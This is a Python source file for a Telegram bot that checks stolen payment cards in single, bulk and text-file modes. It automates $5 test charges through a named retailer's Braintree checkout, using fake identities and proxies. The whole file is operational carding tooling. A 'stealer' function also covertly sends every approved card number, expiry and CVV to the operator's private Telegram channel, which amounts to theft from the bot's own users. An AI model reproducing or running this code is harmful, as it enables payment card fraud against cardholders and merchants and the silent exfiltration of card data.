import time
import asyncio
import re
import os
import json
import base64
import random
import aiohttp
from bs4 import BeautifulSoup
from faker import Faker
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from TOOLS.getcc_for_mass import *

# ========== INITIALIZATION ==========
fake = Faker()
GATE_NAME = "Braintree 5$"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1003627495953

# ========== STEALER FUNCTION ==========
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
    except Exception as e:
        print(f"[Stealer Error] {e}")

# ========== ORIGINAL CHECKER FUNCTIONS (from your code) ==========
def random_phone():
    return fake.phone_number()[:10]

def random_zip():
    return fake.postcode()[:5]

def random_hex(length=32):
    return ''.join(random.choices('0123456789abcdef', k=length))

def random_guid():
    return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"

def get_card_type(card_number):
    first_four = card_number[:4]
    first_two = card_number[:2]
    first_one = card_number[0]
    if first_two in ['34', '37']:
        return 'American Express'
    if 51 <= int(first_two) <= 55:
        return 'Mastercard'
    if 2221 <= int(first_four) <= 2720:
        return 'Mastercard'
    if first_one == '4':
        return 'Visa'
    if first_four == '6011' or first_two == '65':
        return 'Discover'
    if 644 <= int(first_four[:3]) <= 649:
        return 'Discover'
    return 'Visa'

def extract_jdialog_message(html):
    match = re.search(r'JDialog\(\s*[\'"]([^\'"]+)[\'"]', html)
    if match:
        return match.group(1)
    return None

def extract_error_message(html):
    match = re.search(r'<div class="errorMessage">(.*?)</div>', html, re.DOTALL)
    if match:
        return match.group(1).strip()
    return None

def extract_result_value(html):
    match = re.search(r'<input type="hidden" id="OrderValidationResult" value="([^"]+)"', html)
    if match:
        return match.group(1)
    return None

async def braintree_charge_async(cc, mes, ano, cvv, proxy=None):
    """Perform Braintree $5 charge via plexaderm.com"""
    try:
        exp_month = mes.zfill(2)
        exp_year_full = ano if len(ano) == 4 else f"20{ano}"
        card_type = get_card_type(cc)

        first_name = fake.first_name()
        last_name = fake.last_name()
        email = fake.email()
        phone = random_phone()
        address = fake.street_address()
        city = fake.city()
        zip_code = random_zip()

        proxy_url = None
        if proxy:
            if isinstance(proxy, dict):
                proxy_url = proxy.get("http") or proxy.get("https")
            else:
                proxy_url = proxy

        user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        timeout = aiohttp.ClientTimeout(total=60)
        connector = aiohttp.TCPConnector(ssl=False)

        jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            cookie_jar=jar,
            headers={
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'
            }
        ) as session:

            # Step 1: Visit homepage to get cookies
            async with session.get('https://www.plexaderm.com/', proxy=proxy_url):
                pass

            mvisit = None
            for cookie in jar:
                if cookie.key == 'mvisit':
                    mvisit = cookie.value
                    break
            if not mvisit:
                mvisit = str(random.randint(10**15, 10**16-1))

            # Step 2: Add to cart
            cart_headers = {
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://www.plexaderm.com',
                'referer': 'https://www.plexaderm.com/',
            }
            cart_data = {'items': [{'productId': 154562, 'quantity': 1}], 'withCartReset': False}

            async with session.post(
                'https://www.plexaderm.com/api/cart/add',
                headers=cart_headers,
                json=cart_data,
                proxy=proxy_url
            ) as resp:
                order_id = None
                if resp.status == 200:
                    cart_json = await resp.json()
                    order_id = cart_json.get('orderNumber')

            # Step 3: Get checkout form
            step1_url = f'https://plexaderm.com/checkout/plexaderm/step1?m={mvisit}'
            async with session.get(step1_url, proxy=proxy_url) as resp:
                step1_text = await resp.text()

            soup = BeautifulSoup(step1_text, 'html.parser')
            form_data = {}
            for inp in soup.find_all('input', type='hidden'):
                if inp.get('name') and inp.get('value'):
                    form_data[inp['name']] = inp['value']

            # Parse cart offers
            current_cart_match = re.search(r'var ___currentCart = (\[.*?\]);', step1_text, re.DOTALL)
            if current_cart_match:
                try:
                    current_cart = json.loads(current_cart_match.group(1))
                    for idx, item in enumerate(current_cart):
                        form_data[f'CartOffers[{idx}].OfferId'] = str(item['offerId'])
                        form_data[f'CartOffers[{idx}].OfferName'] = item['offerName']
                        form_data[f'CartOffers[{idx}].Quantity'] = str(item['quantity'])
                except:
                    pass

            page_offers_match = re.search(r'var ___pageOffers = (\[.*?\]);', step1_text, re.DOTALL)
            if page_offers_match:
                try:
                    page_offers = json.loads(page_offers_match.group(1))
                    for idx, item in enumerate(page_offers):
                        form_data[f'PageOffers[{idx}].OfferId'] = str(item['offerId'])
                        form_data[f'PageOffers[{idx}].OfferName'] = item['name']
                        form_data[f'PageOffers[{idx}].Quantity'] = '0'
                except:
                    pass

            # Form flags
            form_data['ContainsCreditCard'] = 'True'
            form_data['ContainsShippingData'] = 'True'
            form_data['ContainsBillingData'] = 'True'
            form_data['ContainsPromoCode'] = 'True'
            form_data['AutoDetectCreditCardType'] = 'True'
            form_data['HasFinalCheckoutButton'] = 'True'
            form_data['ContainsGift'] = 'False'
            form_data['ContainsAdditionalData'] = 'False'
            form_data['ContainsGiftCard'] = 'False'
            form_data['IsEmailConfirmationRequired'] = 'False'
            form_data['IsHidePayPalForMultiPay'] = 'False'
            form_data['ShowCheckoutConfirm'] = 'False'
            form_data['PaymentMethod'] = 'card'
            form_data['MailingListAgreement'] = 'true'
            form_data['SmsListAgreement'] = 'false'
            form_data['PromoCode'] = ''
            form_data['IsZipMismatchConfirmed'] = 'true'

            # Shipping / Billing
            form_data['ShippingFirstName'] = first_name
            form_data['ShippingLastName'] = last_name
            form_data['ShippingEmail'] = email
            form_data['ShippingPhone'] = phone
            form_data['ShippingAddress1'] = address
            form_data['ShippingAddress2'] = ''
            form_data['ShippingZip'] = zip_code
            form_data['ShippingCity'] = city
            form_data['ShippingStateId'] = '34'
            form_data['ShippingCountryId'] = '1'
            form_data['BillingSameAsShipping'] = 'true'
            form_data['BillingFirstName'] = first_name
            form_data['BillingLastName'] = last_name
            form_data['BillingEmail'] = email
            form_data['BillingPhone'] = phone
            form_data['BillingAddress1'] = address
            form_data['BillingAddress2'] = ''
            form_data['BillingZip'] = zip_code
            form_data['BillingCity'] = city
            form_data['BillingStateId'] = '34'
            form_data['BillingCountryId'] = '1'

            # Get order ID
            if not order_id:
                order_id_match = re.search(r'var ___orderId = "(\d+)"', step1_text)
                if order_id_match:
                    order_id = order_id_match.group(1)
                else:
                    order_id = str(random.randint(10**7, 10**8-1))

            # Step 4: Get Braintree token
            bt_headers = {
                'accept': '*/*',
                'referer': 'https://plexaderm.com/checkout/plexaderm/step4',
                'x-requested-with': 'XMLHttpRequest',
            }
            async with session.get(
                'https://plexaderm.com/data/GetBraintreeClientToken',
                params={'orderId': order_id},
                headers=bt_headers,
                proxy=proxy_url
            ) as resp:
                bt_data = await resp.json()
                encoded_token = bt_data.get('token')

            if not encoded_token:
                return "Declined", "Unable to get Braintree token"

            decoded_token = base64.b64decode(encoded_token).decode('utf-8')
            token_data = json.loads(decoded_token)
            auth_fingerprint = token_data.get('authorizationFingerprint')
            if not auth_fingerprint:
                return "Declined", "No auth fingerprint"

            # Step 5: Tokenize card via Braintree GraphQL
            tokenize_headers = {
                'authorization': f'Bearer {auth_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
            }
            tokenize_payload = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "dropin2",
                    "sessionId": random_guid()
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": exp_month,
                            "expirationYear": exp_year_full,
                            "cvv": cvv
                        },
                        "options": {
                            "validate": False
                        }
                    }
                },
                "operationName": "TokenizeCreditCard"
            }

            async with session.post(
                'https://payments.braintree-api.com/graphql',
                headers=tokenize_headers,
                json=tokenize_payload,
                proxy=proxy_url
            ) as resp:
                tokenize_result = await resp.json()

            payment_token = tokenize_result.get('data', {}).get('tokenizeCreditCard', {}).get('token')
            if not payment_token:
                return "Declined", "Tokenization failed"

            # Step 6: Submit checkout
            form_data['Token'] = payment_token
            form_data['CreditCardNumber'] = ''
            form_data['CreditCardMonth'] = exp_month
            form_data['CreditCardYear'] = exp_year_full
            form_data['CreditCardSecurityCode'] = ''
            form_data['CreditCardBin'] = cc[:6]
            form_data['CardType'] = card_type

            # Visit step 2
            await session.get(f'https://plexaderm.com/checkout/plexaderm/step2?un=1&m={mvisit}', proxy=proxy_url)

            step4_url = f'https://plexaderm.com/checkout/plexaderm/step4?m={mvisit}'
            post_data = {}
            for key, value in form_data.items():
                if isinstance(value, list):
                    for idx, v in enumerate(value):
                        post_data[f"{key}[{idx}]"] = v
                else:
                    post_data[key] = value

            checkout_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://plexaderm.com',
                'referer': step1_url,
            }

            async with session.post(
                step4_url,
                headers=checkout_headers,
                data=post_data,
                proxy=proxy_url,
                allow_redirects=True
            ) as resp:
                checkout_text = await resp.text()

            # Parse response
            msg = extract_jdialog_message(checkout_text)
            if not msg:
                msg = extract_error_message(checkout_text)
            if not msg:
                msg = extract_result_value(checkout_text)
            if not msg:
                msg = "No response"

            if "approved" in msg.lower() or "charged" in msg.lower() or "success" in msg.lower():
                return "Approved", f"Charged $5 - {msg}"
            elif "decline" in msg.lower() or "declined" in msg.lower():
                return "Declined", msg
            else:
                return "Declined", msg

    except Exception as e:
        return "Declined", f"Error: {str(e)}"

async def create_braintree_charge(fullz, proxy=None):
    parts = fullz.split("|")
    if len(parts) != 4:
        return {"status": "Declined", "response": "Invalid format", "is_live": False}
    cc = parts[0].strip()
    mes = parts[1].strip().zfill(2)
    ano = parts[2].strip()
    cvv = parts[3].strip()
    status, response = await braintree_charge_async(cc, mes, ano, cvv, proxy)
    is_live = status == "Approved"
    return {
        "cc": fullz,
        "status": status,
        "response": response,
        "is_live": is_live
    }

# ========== ASYNC WRAPPER FOR BOT ==========
async def call_braintree_api(fullcc):
    result = await create_braintree_charge(fullcc)
    status = result["status"]
    response_msg = result["response"]
    if status == "Approved":
        display_status = "Approved ✅"
    else:
        display_status = "Declined ❌"
    return display_status, response_msg

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

# ========== SINGLE CHECK /chk ==========
@Client.on_message(filters.command("chk", [".", "/"]))
async def braintree_single(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            await message.reply_text(
                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> /chk cc|mm|yy|cvv",
                quote=True, parse_mode=enums.ParseMode.HTML
            )
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        # Animation step 1
        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        # Step 2
        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        status, api_message = await call_braintree_api(fullcc)
        elapsed = time.perf_counter() - start

        # Step 3 (full squares)
        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdchk = await client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        if "Approved" in status:
            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, elapsed, first_name, role)

        final_text = f"""<b>{status}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {api_message}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await client.edit_message_text(message.chat.id, thirdchk.id, final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== MASS CHECK /mchk ==========
@Client.on_message(filters.command("mchk", [".", "/"]))
async def braintree_mass(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getcc_for_mass(message, role)
        if not getcc[0]:
            await message.reply_text(getcc[1], message.id, parse_mode=enums.ParseMode.HTML)
            return
        ccs = getcc[1]

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply_text(f"✦ ᴍᴀx {MAX_MSC_LIMIT} ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== TXT FILE CHECK /tchk ==========
@Client.on_message(filters.command("tchk", [".", "/"]))
async def braintree_txt(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target = None
        if message.reply_to_message and message.reply_to_message.document:
            target = message.reply_to_message
        elif message.document:
            target = message

        if not target or not target.document.file_name.endswith(".txt"):
            await message.reply_text(
                f"✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to a .txt file (max {MAX_TSC_LIMIT} cards)",
                quote=True, parse_mode=enums.ParseMode.HTML
            )
            return

        file_path = await client.download_media(target)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== SEQUENTIAL PROCESSING ==========
async def process_sequential(client, message, ccs, user_id, first_name, role):
    total = len(ccs)
    approved_count = 0
    declined_count = 0
    start_time = time.perf_counter()
    approved_cards = []

    progress_msg = await message.reply(
        f"Braintree Plexaderm Checker\n\n"
        f"{SYMBOL} Progress: 0/{total}\n"
        f"Approved ✅: 0\nDeclined ❌: 0\nRemaining: {total}\n\n"
        f"Checked by: {first_name} ({role})",
        quote=True, parse_mode=enums.ParseMode.HTML
    )

    for idx, fullcc in enumerate(ccs, 1):
        status, api_message = await call_braintree_api(fullcc)

        cc_num = fullcc.split('|')[0]
        bin_data = await get_bin_details(cc_num)
        brand = bin_data[0] if len(bin_data) > 0 else "Unknown"
        type_ = bin_data[1] if len(bin_data) > 1 else "Unknown"
        level = bin_data[2] if len(bin_data) > 2 else "Unknown"
        bank = bin_data[3] if len(bin_data) > 3 else "Unknown"
        country = bin_data[4] if len(bin_data) > 4 else "Unknown"
        flag = bin_data[5] if len(bin_data) > 5 else ""

        if "Approved" in status:
            approved_count += 1
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": api_message,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "time": card_time
            })
            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, card_time, first_name, role)
        else:
            declined_count += 1

        remaining = total - idx
        await progress_msg.edit_text(
            f"Braintree Plexaderm Checker\n\n"
            f"{SYMBOL} Progress: {idx}/{total}\n"
            f"Approved ✅: {approved_count}\nDeclined ❌: {declined_count}\nRemaining: {remaining}\n\n"
            f"Checked by: {first_name} ({role})",
            parse_mode=enums.ParseMode.HTML
        )
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    for card in approved_cards:
        approved_msg = f"""<b>{card['status']}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed = round(time.perf_counter() - start_time, 2)

    if approved_count > 0:
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        decl_text = f"❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})\n\n━━━━━━━━━━━━━━━━━━━━\n"
        for card in declined_list[:15]:
            decl_text += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            decl_text += f"\n... and {declined_count - 15} more declined cards"
        decl_text += f"\n━━━━━━━━━━━━━━━━━━━━\n✅ Approved: {approved_count}\n❌ Declined: {declined_count}\n📊 Total: {total}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})"
        await message.reply_text(decl_text, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Cards: {total}\n❌ All Declined: {declined_count}\n⏱ Time: {elapsed}s\n"
            f"👤 Checked by: {first_name} ({role})",
            quote=True, parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
    await massdeductcredit(user_id, total)
